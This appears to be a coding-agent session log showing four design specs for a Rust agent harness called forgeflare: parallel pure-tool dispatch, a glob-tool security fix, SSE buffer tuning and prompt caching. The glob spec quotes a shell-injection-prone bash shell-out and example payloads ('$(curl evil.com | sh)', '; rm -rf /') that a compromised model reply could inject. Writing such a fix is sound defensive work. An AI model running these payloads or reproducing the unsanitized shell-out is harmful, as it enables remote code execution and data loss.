    14→When Claude requests three Read calls in one response, forgeflare dispatches them sequentially (the `for block in ...` tool dispatch loop in the inner loop). Each waits for the previous to complete before starting. Read, Glob, and Grep are pure — no side effects, no ordering dependency, no shared state. Running them concurrently cuts wall-clock time proportionally to the batch size.
    15→
    16→This matters for Ralph loops doing heavy codebase exploration. A typical iteration's orient phase requests 3-5 parallel Reads or Greps. At ~50ms per file read, sequential dispatch adds 150-250ms per orient. Over 50 tool iterations, that's measurable. More importantly, concurrent dispatch reduces the time the API connection sits idle waiting for tool results, keeping the iteration tight.
    17→
    18→The prerequisite is knowing which tools are safe to parallelize. That requires a classification: `{Read, Glob, Grep}` are pure (no side effects), `{Bash, Edit}` are mutating (modify filesystem or execute arbitrary commands). This classification is also useful for future work (smarter recovery logic, post-tool hooks) but the immediate use is parallelism.
    19→
    20→---
    21→
    22→## Requirements
    23→
    24→**R1. Tool Effect Classification**
    25→- Define a `pub` `ToolEffect` enum: `Pure` and `Mutating`
    26→- Map each tool: `Read → Pure`, `Glob → Pure`, `Grep → Pure`, `Bash → Mutating`, `Edit → Mutating`
    27→- Expose via a `pub fn tool_effect(name: &str) -> ToolEffect` in `tools/mod.rs`
    28→- Unknown tool names default to `Mutating` (safe default)
    29→- Import in `main.rs`: update the existing `use tools::{all_tool_schemas, dispatch_tool};` to include `tool_effect` and `ToolEffect`
    30→
    31→**R2. Batch Classification**
    32→- Before dispatching tools, classify the entire batch
    33→- If ALL tools in the batch are `Pure`: dispatch concurrently
    34→- If ANY tool in the batch is `Mutating`: dispatch entire batch sequentially (existing behavior)
    35→- This is conservative — a mixed batch with 4 Reads and 1 Edit runs everything sequentially. That's correct: the Edit might depend on a Read result, and the LLM may have ordered them intentionally.
    36→
    37→**R3. Concurrent Dispatch**
    38→- Use `futures_util::future::join_all()` to await all pure tool calls concurrently (the project depends on `futures-util`, NOT the `futures` umbrella crate — import from `futures_util`)
    39→- The parallel path MUST replicate the null-input guard from the sequential path (check `input.is_null()` and produce an error ToolResult). Recommended approach: check inside each `spawn_blocking` closure, which preserves position ordering naturally since every block gets a future. Do NOT filter before spawning — that creates an ordering problem where null-input error results need to be re-merged at the correct positions.
    40→- Log each tool name BEFORE spawning (same `tool: Name` format as the sequential path) so the user sees progress during concurrent execution
    41→- Collect results in the same order as the original tool_use blocks (preserve ordering for conversation coherence)
    42→- Error handling per-tool: a failed Read doesn't cancel other concurrent Reads. Each produces its own ToolResult (success or error).
    43→
    44→**R4. Preserve Sequential Fallback**
    45→- The `Mutating` path is exactly the existing `for block in ...` tool dispatch loop
    46→- No behavioral change for any batch containing Bash or Edit
    47→- The streaming callback for Bash continues to work as-is in the sequential path
    48→
    49→---
    50→
    51→## Architecture
    52→
    53→```text
    54→tool_use blocks from assistant response
    55→  │
    56→  ├─ classify batch → all Pure?
    57→  │    ├─ yes →
    58→  │    │    ├─ for each tool: log "tool: Name", check null-input guard
    59→  │    │    ├─ spawn_blocking(dispatch_tool) for each valid tool
    60→  │    │    ├─ join_all → collect Vec<(String, ContentBlock)> in order (name + result)
    61→  │    │    └─ log results using preserved names
    62→  │    └─ no  → sequential for-loop (existing code, unchanged)
    63→  │
    64→  ├─ tool_iterations += 1 (BOTH paths must increment)
    65→  │
    66→  └─ tool_results sent back as User message (unchanged)
    67→```
    68→
    69→Changes to existing code:
    70→
    71→1. `tools/mod.rs` — Add `pub ToolEffect` enum and `pub fn tool_effect()` function.
    72→2. `main.rs` — Before the `for block in ...` tool dispatch loop, classify the batch. Branch: if all pure, use `join_all`; otherwise, existing for-loop. The `join_all` path constructs futures from `dispatch_tool()` calls and awaits them together. `tool_iterations += 1` must be present after BOTH the sequential and parallel paths.
    73→
    74→---
    75→
    76→## Success Criteria
    77→
    78→- [ ] 3 concurrent Read calls complete faster than 3 sequential Read calls
    79→- [ ] Mixed batch (Read + Edit) dispatches sequentially (no parallelism)
    80→- [ ] Tool results maintain original ordering regardless of dispatch strategy
    81→- [ ] Individual tool errors don't cancel sibling concurrent tools
    82→- [ ] Existing sequential dispatch tests still pass
    83→- [ ] `ToolEffect` classification is exhaustive (every tool name mapped)
    84→- [ ] Unknown tool names classified as `Mutating`
    85→- [ ] `JoinError` (thread panic) produces a valid ToolResult error with correct tool_use_id
    86→- [ ] Per-tool logging (result size, error preview) present in parallel path
    87→- [ ] Batch of 1 pure tool works correctly (degenerate parallel case)
    88→
    89→---
    90→
    91→## Non-Goals
    92→
    93→- Fine-grained parallelism within mixed batches (e.g., parallelize only the Reads, then run Edit sequentially). The conservative all-or-nothing approach is simpler and correct.
    94→- Async tool implementations (Read/Glob/Grep are sync filesystem ops wrapped in `tokio::task::spawn_blocking`). Making them truly async would require rewriting each tool.
    95→- Configurable concurrency limits (tool batches are typically 1-5 items; no throttling needed)
    96→- Parallelism for Bash commands (even "safe-looking" bash commands can have side effects — always sequential)
    97→
    98→---
    99→
   100→## Implementation Notes
   101→
   102→- `dispatch_tool()` is currently sync (returns `ContentBlock` directly). For `join_all`, wrap each call in `tokio::task::spawn_blocking(move || dispatch_tool(...))` to parallelize blocking I/O. The closure needs owned copies of `name`, `input`, and `id`. Full ownership pattern:
   103→
   104→  ```rust
   105→  let name = name.clone();      // clone for the closure (name is &str from destructuring)
   106→  let name_log = name.clone();  // clone for post-dispatch logging
   107→  let input = input.clone();    // clone for the closure (input is &Value from destructuring)
   108→  let id = id.clone();
   109→  let id_fallback = id.clone(); // clone for JoinError fallback
   110→  let handle = tokio::task::spawn_blocking(move || {
   111→      dispatch_tool(&name, input, &id, &mut |_: &str| {})
   112→  });
   113→  // After join_all, use name_log for logging and id_fallback for JoinError recovery
   114→  ```
   115→
   116→  Pure tool inputs are small (paths, patterns), so clone cost is negligible.
   117→
   118→- The streaming callback (`&mut |chunk| { eprint!("{chunk}"); }`) is `&mut dyn FnMut(&str)` which is neither `Send` nor `'static` — it cannot be moved into a `spawn_blocking` closure. For the pure path, create a local no-op callback inside each closure: `&mut |_: &str| {}`. Pure tools (Read, Glob, Grep) don't stream output, so the no-op loses nothing.
   119→- `join_all` returns `Vec<Result<ContentBlock, JoinError>>`. `JoinError` indicates a thread panic. Use `id_fallback` (cloned before spawning) to build `ContentBlock::ToolResult { tool_use_id: id_fallback, content: "tool panicked", is_error: Some(true) }`.
   120→- Order preservation: `join_all` returns results in the same order as the input futures. No reordering needed.
   121→- **Tool name preservation for logging:** `ContentBlock::ToolResult` does not contain the tool name, only `tool_use_id`. The parallel path must collect `(String, ContentBlock)` tuples (name + result) rather than bare `ContentBlock` values, so post-dispatch logging can print `tool: Name` with result size/error preview. Clone the name before spawning and pair it with the result after `join_all` completes.
   122→- Pre-dispatch logging: print `tool: {name}` (or `tool: {name}({input})` in verbose mode) for each tool BEFORE spawning the `spawn_blocking` tasks, using the same `color()` format as the sequential path. This happens on the main thread, not inside the closures.
   123→- Post-dispatch logging: after `join_all` completes, iterate the `(name, result)` tuples and print the same result format as the sequential path (size or error preview, conditional on `cli.verbose` and `is_error`).
   124→- The batch classification is O(n) where n is tool count per response (typically 1-5). Negligible overhead.
   125→- The `tool_results.is_empty()` break guard (currently after the sequential for-loop) must be preserved after both the parallel and sequential paths. If somehow the parallel path produces zero results, the inner loop should break.
   126→- This change makes `dispatch_tool` callable from multiple threads simultaneously. Each invocation is independent and only performs read-only filesystem operations for pure tools. No shared mutable state.
   127→- All references use structural landmarks (function names, `for block in`, `tool_iterations`) rather than line numbers, since earlier specs in the implementation order modify the same files.
   128→"}]},"uuid":"2ec9b6cc-5233-4d17-9d9e-db71ceaf4f26","timestamp":"2026-03-12T04:45:41.890Z","sourceToolAssistantUUID":"876fc3cb-4bd5-4382-9b6b-8e9761948cc2","userType":"external","cwd":"/Users/basher8383/3I/forge/forgeflare-hooks","sessionId":"8aac52da-2edf-4887-bae8-ee91f66f8d8c","version":"2.1.74","gitBranch":"main","slug":"peaceful-plotting-wand"}

     6→# Replace Shell Injection in Glob Tool
     7→
     8→**Target:** Eliminate shell injection vulnerability in `glob_exec` by replacing bash shell-out with the `glob` Rust crate
     9→
    10→---
    11→
    12→## Why
    13→
    14→`glob_exec` in `src/tools/mod.rs` interpolates user-supplied patterns directly into a bash command string:
    15→
    16→```rust
    17→let output = Command::new("bash")
    18→    .arg("-c")
    19→    .arg(format!(
    20→        "shopt -s globstar nullglob; files=({full_pattern}); printf '%s\\n' \"${{files[@]}}\" | head -1000"
    21→    ))
    22→```
    23→
    24→The `pattern` parameter comes from the LLM's tool_use response. A malicious or compromised model response could inject arbitrary shell commands via the pattern, e.g., `$(curl evil.com | sh)` or `; rm -rf /`. The command executes under `bash -c` with no sanitization.
    25→
    26→This is worse than it looks because `Glob` is classified as `ToolEffect::Pure`, meaning guard hooks skip it entirely. The tool is assumed safe because it should be read-only, but the shell-out makes it a full code execution vector with no guardrails.
    27→
    28→The fix is to use Rust's `glob` crate, which does pattern matching in-process with no shell involvement. This eliminates the injection surface entirely rather than trying to sanitize inputs.
    29→
    30→---
    31→
    32→## Requirements
    33→
    34→**R1. Replace Shell-Out with `glob` Crate**
    35→- Add the `glob` crate as a dependency in `Cargo.toml`
    36→- Rewrite `glob_exec` to use `glob::glob()` or `glob::glob_with()` instead of `Command::new("bash")`
    37→- No shell subprocess spawned by the Glob tool under any input
    38→
    39→**R2. Preserve Existing Behavior**
    40→- Pattern matching: support `**` (recursive), `*`, `?`, `[...]` character classes
    41→- Base directory: respect the `path` parameter (default `.`) as the search root
    42→- Result format: newline-separated file paths, same as current output
    43→- Result limit: cap at 1000 entries (current `head -1000` behavior)
    44→- Empty results: return `"No files found"` string (current behavior)
    45→- Sorting: current behavior sorts by shell expansion order. The `glob` crate returns results in filesystem order (platform-dependent). This is acceptable — the tool description says "sorted by modification time" but the implementation never sorted by mtime. Do not add mtime sorting; accept glob crate ordering.
    46→
    47→**R3. Pattern Construction**
    48→- If the pattern starts with `/` or `.`, use it as-is (absolute or explicit relative)
    49→- Otherwise, prepend the base directory: `format!("{base}/{pattern}")`
    50→- This matches the current path construction logic at lines 192-196
    51→
    52→**R4. Error Handling**
    53→- `glob::glob()` returns a `Result<Paths, PatternError>`. Map `PatternError` to an `Err(String)` with a descriptive message including the invalid pattern.
    54→- Individual path results within the iterator are `Result<PathBuf, GlobError>`. Skip entries that fail (permission denied on a directory, etc.) rather than aborting the entire glob. Log nothing — the user sees the successful matches.
    55→
    56→**R5. Brace Expansion Pre-Processing**
    57→- The `glob` crate does not support brace expansion (`{a,b,c}`). Bash expands braces before globbing, and the LLM regularly generates patterns like `**/*.{rs,toml}` and `src/{main,lib}.rs`.
    58→- Before calling `glob::glob()`, detect and expand brace groups in the pattern. For each brace group, produce one pattern per alternative and glob each independently, deduplicating and merging results.
    59→- Only handle a single top-level brace group (e.g., `**/*.{rs,toml}`). Nested braces (`{a,{b,c}}`) and multiple brace groups (`{a,b}-{c,d}`) are not worth the complexity — treat them as literal characters.
    60→- Implementation: find `{`, find matching `}`, split contents on `,`, produce expanded patterns. If `{` is found but no matching `}` exists after it, treat the pattern as having no brace group and pass it through unchanged.
    61→- If any expanded pattern produces a `PatternError`, fail the entire operation (return `Err`). Do not return partial results from valid expansions — the original pattern is malformed and partial results would mask the error.
    62→- The 1000-entry result limit (R2) applies to the combined deduplicated results across all expanded patterns, not per-pattern.
    63→
    64→---
    65→
    66→## Architecture
    67→
    68→```text
    69→glob_exec(input)
    70→  │
    71→  ├─ extract pattern, base from input (unchanged)
    72→  ├─ construct full_pattern (unchanged logic)
    73→  │
    74→  ├─ expand_braces(full_pattern) → Vec<String>
    75→  │    ├─ find first '{' and matching '}'
    76→  │    ├─ if '{' found but no matching '}' → vec![full_pattern] (pass through)
    77→  │    ├─ split alternatives on ','
    78→  │    ├─ produce one pattern per alternative (prefix + alt + suffix)
    79→  │    └─ if no braces found → vec![full_pattern]
    80→  │
    81→  ├─ for each expanded pattern:
    82→  │    ├─ glob::glob(&pattern)
    83→  │    │    ├─ Err(PatternError) → return Err("Invalid glob pattern: ...")
    84→  │    │    └─ Ok(paths) →
    85→  │    │         ├─ filter_map: skip Err entries (permission errors)
    86→  │    │         └─ add to results Vec if not in seen HashSet (preserves order)
    87→  │    └─ stop collecting when results.len() >= 1000
    88→  │
    89→  └─ if result empty → "No files found"
    90→     else → newline-joined String
    91→```
    92→
    93→Changes to existing code:
    94→
    95→1. `Cargo.toml` — Add `glob = "0.3"` to `[dependencies]`
    96→2. `src/tools/mod.rs` — Rewrite `glob_exec` function body. No signature change. No changes to other functions.
    97→
    98→---
    99→
   100→## Success Criteria
   101→
   102→- [ ] `glob_exec` produces no `Command::new("bash")` calls
   103→- [ ] Pattern `**/*.rs` from project root returns Rust source files
   104→- [ ] Pattern `src/*.rs` returns files in src directory
   105→- [ ] Pattern with no matches returns `"No files found"`
   106→- [ ] Result count capped at 1000 entries
   107→- [ ] Invalid pattern (e.g., `[`) returns an error, not a panic
   108→- [ ] Shell metacharacters in pattern (`$(cmd)`, `;rm`, backticks) are treated as literal pattern characters, not executed
   109→- [ ] Pattern `**/*.{rs,toml}` returns both `.rs` and `.toml` files
   110→- [ ] Pattern `src/{main,lib}.rs` returns both files
   111→- [ ] Pattern with `path` parameter (e.g., `pattern: "*.rs"`, `path: "src"`) returns files from the specified directory
   112→- [ ] `ToolEffect::Pure` classification remains correct (the tool IS now genuinely pure)
   113→- [ ] Existing Glob-related tests pass
   114→- [ ] `cargo clippy -- -D warnings` clean
   115→
   116→---
   117→
   118→## Non-Goals
   119→
   120→- Modification time sorting (not implemented currently despite tool description claiming it)
   121→- Hidden file inclusion/exclusion options (follow glob crate defaults)
   122→- Symlink following configuration (follow glob crate defaults)
   123→- Changing the tool's schema, description, or ToolEffect classification
   124→- Adding the `globset` crate (overkill for this use case; `glob` + brace pre-processing is sufficient)
   125→- Nested brace expansion (`{a,{b,c}}`) or multiple brace groups (`{a,b}-{c,d}`) — single top-level group only
   126→
   127→---
   128→
   129→## Implementation Notes
   130→
   131→- The `glob` crate's `glob()` function takes a pattern string and returns an iterator of `Result<PathBuf, GlobError>`. Use `glob::glob()` (not `glob_with()` with `MatchOptions::default()`) — `glob()` uses `MatchOptions::new()` which sets `case_sensitive: true`, matching bash behavior. `Default::default()` sets `case_sensitive: false`, which would be a silent behavioral change on case-sensitive filesystems.
   132→- `glob` supports `**` for recursive matching. The `**` token is handled as a special `AnyRecursiveSequence` that explicitly crosses directory boundaries. No need for bash's `shopt -s globstar`.
   133→- The `glob` crate returns results in alphabetical order (not filesystem/platform-dependent order). This is acceptable and similar to bash's locale-dependent sorted expansion order.
   134→- The `glob` crate handles `nullglob` semantics naturally — an empty iterator means no matches, which maps to the existing `"No files found"` return.
   135→- The `use std::process::Command` import in `tools/mod.rs` is still needed for `bash_exec` and `grep_exec`. Do not remove it.
   136→- This is a security fix. It should be the first item implemented in the next planning cycle.
   137→"}]},"uuid":"809c9930-a1aa-45cf-8377-b5c7a06f7ded","timestamp":"2026-03-12T04:45:42.235Z","sourceToolAssistantUUID":"a368eaf1-1a3a-42e7-9da7-a08b6ed5b132","userType":"external","cwd":"/Users/basher8383/3I/forge/forgeflare-hooks","sessionId":"8aac52da-2edf-4887-bae8-ee91f66f8d8c","version":"2.1.74","gitBranch":"main","slug":"peaceful-plotting-wand"}

     5→
     6→# Optimize SSE Buffer Reallocation
     7→
     8→**Target:** Eliminate unnecessary String allocation in the SSE parser's event extraction loop by using `drain` or offset tracking instead of slice-to-String copies
     9→
    10→---
    11→
    12→## Why
    13→
    14→The SSE parser in `src/api.rs` processes streaming chunks by accumulating bytes into a `buffer: String` and splitting on `\n\n` (double newline, the SSE event boundary). The current extraction:
    15→
    16→```rust
    17→let event_block = buffer[..pos].to_string();
    18→buffer = buffer[pos + 2..].to_string();
    19→```
    20→
    21→Both lines allocate a new String. The second line is the problem: every time an event is extracted, the remaining buffer is copied into a fresh allocation. For a response with N SSE events where the average remaining buffer is M bytes, total copy work is O(N * M). In practice this is not catastrophic because SSE events are small (typically 100-500 bytes each) and arrive incrementally, so M stays small. But it's gratuitous allocation that's trivial to fix.
    22→
    23→---
    24→
    25→## Requirements
    26→
    27→**R1. Eliminate Remaining-Buffer Reallocation**
    28→- After extracting an event from the buffer, advance past it without copying the remaining content into a new String
    29→- Two acceptable approaches:
    30→  - `buffer.drain(..pos + 2)` — removes consumed bytes in-place, shifts remaining bytes to front. Single `memmove` instead of allocate + copy + free.
    31→  - Offset tracking — maintain a `start: usize` index and only compact when the buffer exceeds a threshold. More complex, not worth it for SSE-sized buffers.
    32→- Prefer `drain` for simplicity.
    33→
    34→**R2. Eliminate Event-Block Allocation**
    35→- `event_block = buffer[..pos].to_string()` creates a copy just to iterate lines
    36→- Instead, take a slice reference `&buffer[..pos]` and iterate lines directly
    37→- This avoids one allocation per event
    38→
    39→**R3. Preserve Exact Parsing Behavior**
    40→- The parser must produce identical output for all existing SSE test cases
    41→- Event boundary detection (double newline) unchanged
    42→- `data:` line extraction unchanged
    43→- JSON parsing of event data unchanged
    44→- All content_block_start, content_block_delta, content_block_stop, message_start, message_delta, error event handling unchanged
    45→
    46→---
    47→
    48→## Architecture
    49→
    50→```text
    51→Current:
    52→  buffer.push_str(&chunk);
    53→  while let Some(pos) = buffer.find("\n\n") {
    54→      let event_block = buffer[..pos].to_string();     // ALLOC 1
    55→      buffer = buffer[pos + 2..].to_string();           // ALLOC 2
    56→      for line in event_block.lines() { ... }
    57→  }
    58→
    59→After:
    60→  buffer.push_str(&chunk);
    61→  while let Some(pos) = buffer.find("\n\n") {
    62→      {
    63→          let event_block = &buffer[..pos];              // NO ALLOC (slice)
    64→          for line in event_block.lines() { ... }
    65→      }
    66→      buffer.drain(..pos + 2);                           // IN-PLACE (memmove)
    67→  }
    68→```
    69→
    70→Changes to existing code:
    71→
    72→1. `src/api.rs`, `parse_sse_stream()` — Replace the two `.to_string()` calls in the event extraction loop (lines 213-214) with a slice reference and `drain`. The borrow scope of the slice must end before `drain` is called (use a block `{ ... }` to scope the borrow).
    73→
    74→---
    75→
    76→## Success Criteria
    77→
    78→- [ ] No `.to_string()` calls on buffer slices in the SSE event extraction loop
    79→- [ ] All 6 existing SSE parser tests pass unchanged
    80→- [ ] `parse_sse_text_response` — text streaming and block assembly
    81→- [ ] `parse_sse_tool_use_response` — tool input JSON accumulation
    82→- [ ] `parse_sse_error_event_transient` — overloaded_error handling
    83→- [ ] `parse_sse_error_event_permanent` — invalid_request_error handling
    84→- [ ] `parse_sse_missing_stop_reason` — connection drop detection
    85→- [ ] `parse_sse_usage_from_message_start_and_delta` — cache token parsing
    86→- [ ] `cargo clippy -- -D warnings` clean
    87→
    88→---
    89→
    90→## Non-Goals
    91→
    92→- Rewriting the SSE parser to use a streaming parser library (e.g., `eventsource-stream`)
    93→- Pre-allocating the buffer with a capacity hint (the buffer is already created with `String::new()` and grows as needed — fine for SSE)
    94→- Benchmarking the change (the improvement is obvious from first principles — fewer allocations is fewer allocations)
    95→- Changing the chunk accumulation strategy (`buffer.push_str(&String::from_utf8_lossy(&chunk))` is fine)
    96→- Handling partial UTF-8 sequences across chunk boundaries (existing behavior, out of scope)
    97→
    98→---
    99→
   100→## Implementation Notes
   101→
   102→- The borrow checker requires that the slice reference `&buffer[..pos]` is dropped before `buffer.drain()` is called. Use a block scope:
   103→
   104→```rust
   105→while let Some(pos) = buffer.find("\n\n") {
   106→    {
   107→        let event_block = &buffer[..pos];
   108→        for line in event_block.lines() {
   109→            // ... existing line processing ...
   110→        }
   111→    }
   112→    buffer.drain(..pos + 2);
   113→}
   114→```
   115→
   116→- `String::drain(range)` returns a `Drain` iterator. We don't need the drained content, so just let it drop: `buffer.drain(..pos + 2);` (the semicolon drops the iterator).
   117→- The `drain` approach does an internal `memmove` to shift remaining bytes to the buffer's start. For SSE-sized buffers (typically a few KB at most), this is effectively free.
   118→- This has no dependency on other specs. It can be implemented in any order.
   119→- This is the lowest-priority of the 5 specs. The performance impact is negligible in practice, but the fix is trivial and makes the code cleaner.
   120→"}]},"uuid":"645f98b5-16b5-4a5f-8f58-ca4e62fbdb96","timestamp":"2026-03-12T04:45:42.641Z","sourceToolAssistantUUID":"10a92e85-3896-4c62-abfd-14610dbd031f","userType":"external","cwd":"/Users/basher8383/3I/forge/forgeflare-hooks","sessionId":"8aac52da-2edf-4887-bae8-ee91f66f8d8c","version":"2.1.74","gitBranch":"main","slug":"peaceful-plotting-wand"}

     4→---
     5→
     6→# Prompt Caching for System Prompt and Tools
     7→
     8→**Target:** Add `cache_control` to system prompt and tool definitions to enable Anthropic's prompt caching, reducing input token costs by up to 90% on multi-turn conversations
     9→
    10→---
    11→
    12→## Why
    13→
    14→Every API call in `send_message()` re-sends the full system prompt and all tool definitions at full token cost. For a 50-iteration Ralph loop where the system prompt and tools consume ~3K tokens each call, that's ~150K wasted input tokens that could be served from cache at 10% cost after the first call.
    15→
    16→The infrastructure is half-built: the `Usage` struct already tracks `cache_creation_input_tokens` and `cache_read_input_tokens` from the API response, and the SSE parser correctly extracts these values from `message_start` events. The request side just never asks for caching.
    17→
    18→Anthropic's prompt caching requires sending the system prompt as an array of content blocks (not a plain string) with `cache_control: {"type": "ephemeral"}` on the last block. Similarly, tool definitions need `cache_control` on the last tool in the array. The API then caches everything up to and including the marked blocks.
    19→
    20→---
    21→
    22→## Requirements
    23→
    24→**R1. System Prompt as Cached Content Block**
    25→- Change the `"system"` field in the API request body from a plain string to an array of content blocks
    26→- The array contains a single text block with the system prompt content
    27→- The text block includes `"cache_control": {"type": "ephemeral"}`
    28→- Format:
    29→
    30→```json
    31→"system": [
    32→  {
    33→    "type": "text",
    34→    "text": "You are a coding assistant...",
    35→    "cache_control": {"type": "ephemeral"}
    36→  }
    37→]
    38→```
    39→
    40→**R2. Tool Definitions with Cache Control**
    41→- Add `"cache_control": {"type": "ephemeral"}` to the LAST tool definition in the tools array
    42→- Only the last tool needs the marker — the API caches everything up to and including it
    43→- Do not modify tool schemas in `tools/mod.rs`. Add the cache_control field in `send_message()` when constructing the request body, after cloning the tools array.
    44→
    45→**R3. No Change to Response Parsing**
    46→- The `Usage` struct and SSE parser already handle cache token fields correctly
    47→- No changes needed to `parse_sse_stream` or `Usage`
    48→
    49→**R4. Verbose Logging**
    50→- In verbose mode, after each API response, log cache hit rate: `[verbose] Cache: {cache_read_input_tokens} read, {cache_creation_input_tokens} created, {input_tokens} total input`
    51→- This lets operators verify caching is working
    52→
    53→---
    54→
    55→## Architecture
    56→
    57→```text
    58→send_message()
    59→  │
    60→  ├─ Construct system as array of content blocks (not string)
    61→  │    └─ Single text block with cache_control
    62→  │
    63→  ├─ Clone tools array, add cache_control to last element
    64→  │
    65→  ├─ Build request body with modified system and tools
    66→  │
    67→  └─ Send request (rest unchanged)
    68→```
    69→
    70→Changes to existing code:
    71→
    72→1. `src/api.rs`, `send_message()` — Replace `"system": system` on line 143 of the `json!` macro with the content block array inline. Replace the existing `if !tools.is_empty()` block (lines 148-150) with the clone-and-mutate version that adds cache_control to the last tool.
    73→2. `src/main.rs`, `run_turn()` — Add cache hit logging on the common path after usage destructuring (~line 418), before block processing. This runs for every API response regardless of stop reason. Guard with `if cli.verbose`.
    74→
    75→---
    76→
    77→## Success Criteria
    78→
    79→- [ ] System prompt sent as array of content blocks with `cache_control`
    80→- [ ] Last tool definition includes `cache_control`
    81→- [ ] Second API call in a conversation shows non-zero `cache_read_input_tokens`
    82→- [ ] First API call shows non-zero `cache_creation_input_tokens`
    83→- [ ] Verbose mode logs cache statistics per API call
    84→- [ ] All existing tests pass (SSE parser tests don't depend on request format)
    85→- [ ] Tool schemas from `all_tool_schemas()` remain unmodified (cache_control added at send time)
    86→
    87→---
    88→
    89→## Non-Goals
    90→
    91→- Caching conversation messages (only system and tools are cacheable with the ephemeral strategy)
    92→- Cache TTL configuration (Anthropic controls TTL server-side, currently 5 minutes)
    93→- Conditional caching based on conversation length (always cache — the overhead is negligible)
    94→- Beta header management (prompt caching is GA, no beta header needed)
    95→
    96→---
    97→
    98→## Implementation Notes
    99→
   100→- The `anthropic-version` header is already `2023-06-01`. Prompt caching works with this version. No header changes needed.
   101→- The `send_message` function continues to accept the system prompt as `&str`. The string-to-content-block conversion happens inside `send_message()`, not at the call site. This preserves the interface for callers (including the project-instructions-loading spec, which appends to the system prompt string before passing it in).
   102→- Construct the system prompt as a content block array inline in the `json!` macro (replace line 143, do not add a separate reassignment after the macro):
